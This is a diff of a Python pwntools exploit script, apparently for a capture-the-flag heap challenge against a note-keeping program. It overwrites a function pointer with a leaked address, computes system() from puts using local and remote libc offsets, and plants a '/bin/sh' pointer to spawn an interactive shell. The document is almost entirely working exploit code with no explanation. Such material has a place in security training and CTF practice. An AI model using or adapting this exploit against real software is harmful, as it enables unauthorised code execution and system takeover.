@@ -69,7 +69,6 @@ do_delete(b'1')
 
 note=b"C"*48
 note+=p64(ptr_print)
-note+=b"testing"
 do_add(b'3',b'3',b'3',b'-1',note)
 do_print(b'2')
 
@@ -106,19 +105,11 @@ puts_system_distance=0x2d7a0    # Local offset
 #puts_system_distance=0x31550    # Remote offset  
 system_addr=puts_addr-puts_system_distance
 
-do_delete(b'3')
-
-note=b"F"*64
-note+=p64(system_addr)
-do_add(b'4',b'4',b'4',b'-1',note)
-
-note=b"G"*55
-note+=b"\x00"
-do_add(b'5',b'5',b'5',b'-1',note)
-
-note=b"H"*48
+note=b"F"*48
 note+=p64(ptr_binsh)
-do_add(b'6',b'6',b'6',b'-1',note)
+note+=b"G"*8
+note+=p64(system_addr)
+do_add(b'5',b'5',b'5',b'-1',note)
 do_print(b'2')
 
 io.interactive()
